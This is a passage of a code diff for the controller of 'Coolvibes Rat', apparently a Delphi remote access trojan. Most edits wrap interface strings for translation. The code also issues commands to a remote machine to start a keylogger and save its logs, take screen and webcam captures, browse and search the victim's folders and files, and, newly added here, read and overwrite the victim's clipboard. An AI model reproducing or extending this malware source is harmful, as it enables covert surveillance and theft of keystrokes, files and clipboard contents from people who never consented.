+    PrefijoGuardarCaptura := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('captura_'))
 else
 if((PrefijoGuardarWebcam = '') and (PageControl.activepage = TabWebcam)) then
-    PrefijoGuardarWebcam := InputBox('Prefijo captura','Prefijo captura', 'webcam_')
+    PrefijoGuardarWebcam := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('webcam_'))
 else
 if((PrefijoGuardarCaptura <> '') and (PageControl.activepage = TabScreencap)) then
     PrefijoGuardarCaptura := ''
@@ -3590,7 +3676,7 @@ end;
 procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
 begin
   SpeedButtonActivarKeylogger.enabled := false;
-  if(SpeedButtonActivarKeylogger.caption = 'Activar Keylogger') then
+  if(SpeedButtonActivarKeylogger.caption = _('Activar Keylogger')) then
   begin
     if(EditLogName.text <> '') then
       Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|'+EditLogName.text+'|')
@@ -3622,16 +3708,16 @@ end;
 
 procedure TFormControl.SpeedButtonGuardarLogClick(Sender: TObject);
 begin
-  DlgGuardar.Title      := 'Guardar Log de Keylogger ::Coolvibes Rat::';
+  DlgGuardar.Title      := _('Guardar Log de Keylogger ::Coolvibes Rat::');
   DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := 'Texto .txt';
+  DlgGuardar.Filter     := _('Texto .txt');
   DlgGuardar.DefaultExt := 'txt';
   if DlgGuardar.Execute then
   begin 
     RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
     RichEditKeylogger.lines.savetofile(DlgGuardar.FileName);
 
-    StatusBar.Panels[1].Text := 'Log guardado como: ' + DlgGuardar.FileName;
+    StatusBar.Panels[1].Text := _('Log guardado como: ') + DlgGuardar.FileName;
   end;
 end;
 
@@ -3712,7 +3798,7 @@ begin
     end;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 
 end;
 
@@ -3850,7 +3936,7 @@ begin
                   nbit.Height := IconosGrandes.height;
                    t := Imglist.add(nbit,nil);
                   listviewarchivos.items[o].imageindex := IconosGrandes.count+t;
-                  Statusbar.panels[1].text := 'Cargadas '+inttostr(t+1)+' de '+inttostr(FCatalogItemCount)+' Miniaturas.';
+                  Statusbar.panels[1].text := _('Cargadas ')+inttostr(t+1)+_(' de ')+inttostr(FCatalogItemCount)+' Miniaturas.';
                   nbit.free;
                   bit.free;
                   bit := nil;
@@ -3875,7 +3961,7 @@ begin
   end;
   IconosGrandes.addimages(imglist);
   listviewarchivos.items.endupdate;
-  Statusbar.panels[1].text := 'Miniaturas cargadas!';
+  Statusbar.panels[1].text := _('Miniaturas cargadas!');
 end;
 
 
@@ -3929,7 +4015,7 @@ begin
     btnactualizararchivos.Click;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Sistema1Click(Sender: TObject);
@@ -3956,7 +4042,7 @@ begin
     btnactualizararchivos.Click;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Slolectura1Click(Sender: TObject);
@@ -3983,7 +4069,7 @@ begin
     btnactualizararchivos.Click;
   end
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.SpeedButtonRutasRapidasClick(Sender: TObject);
@@ -3999,20 +4085,18 @@ end;
 
 procedure TFormControl.Windir1Click(Sender: TObject);
 begin
-  BtnActualizararchivos.enabled := false;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('GORUTA|WINDIR')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Directoriodesistema1Click(Sender: TObject);
 begin
-  BtnActualizararchivos.enabled := false;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('GORUTA|SYSDIR')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 
 end;
 
@@ -4021,8 +4105,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('GORUTA|DOCUMENTOS')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
-  BtnActualizararchivos.enabled := false;
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Escritorio1Click(Sender: TObject);
@@ -4030,8 +4113,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('GORUTA|ESCRITORIO')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
-  BtnActualizararchivos.enabled := false;
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.ArchivosRecientes1Click(Sender: TObject);
@@ -4039,8 +4121,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('GORUTA|RECIENTE')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
-  BtnActualizararchivos.enabled := false;
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Directoriodeinstalaciondecoolvibes1Click(
@@ -4049,8 +4130,7 @@ begin
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('GORUTA|CURRENTDIR')
   else
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
-  BtnActualizararchivos.enabled := false;
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.ComboBoxWebcamKeyPress(Sender: TObject;
@@ -4065,7 +4145,7 @@ procedure TFormControl.ListViewVentanasCustomDrawItem(
 begin
   if item = nil then exit;
   if item.subitems.count > 0 then
-  if item.subitems[1] = 'Activa' then
+  if item.subitems[1] = _('Activa') then
   begin
     Sender.Canvas.Font.style := [fsbold];
     Sender.Canvas.Font.Color := clGreen;
@@ -4089,12 +4169,6 @@ begin
    BtnRefrescarInformacion.click;
 end;
 
-procedure TFormControl.TabProcesosShow(Sender: TObject);
-begin
-  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   BtnRefrescarProcesos.click;
-end;
-
 procedure TFormControl.TabSheetVerArchivosShow(Sender: TObject);
 begin
 if(FormOpciones.CheckBoxAutoRefrescar.checked) then
@@ -4109,10 +4183,10 @@ end;
 
 procedure TFormControl.SpeedButtonBuscarClick(Sender: TObject);
 begin
-  if SpeedButtonBuscar.caption = 'Comenzar' then   //comenzar
+  if SpeedButtonBuscar.caption = _('Comenzar') then   //comenzar
   begin
     ListviewBuscar.Items.Clear;
-    SpeedButtonBuscar.caption := 'Parar';
+    SpeedButtonBuscar.caption := _('Parar');
     editbuscar.Enabled := false;
     TabSheetBuscar.highlighted := true; 
     Servidor.Connection.WriteLn('STARTSEARCH|'+editbuscar.text+'|');
@@ -4226,6 +4300,33 @@ begin
   if EditBuscar.enabled then
     EditBuscar.text := EditPathArchivos.text+'*';
 
+end;
+
+// Portapapeles!
+procedure TFormControl.SpeedButtonClipBoard1Click(Sender: TObject);
+begin
+  if Servidor.Connection.Connected then
+  begin
+    Servidor.Connection.Writeln('GETCLIP');
+  end
+  else
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+end;
+procedure TFormControl.SpeedButtonClipBoard2Click(Sender: TObject);
+begin
+  if Servidor.Connection.Connected then
+  begin
+    Servidor.Connection.Writeln('SETCLIP|'+ MemoClipBoard.Text);
+  end
+  else
+    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+end;
+
+
+procedure TFormControl.TabProcesosShow(Sender: TObject);
+begin
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+   BtnRefrescarProcesos.click;
 end;
 
 end.//Fin del proyecto
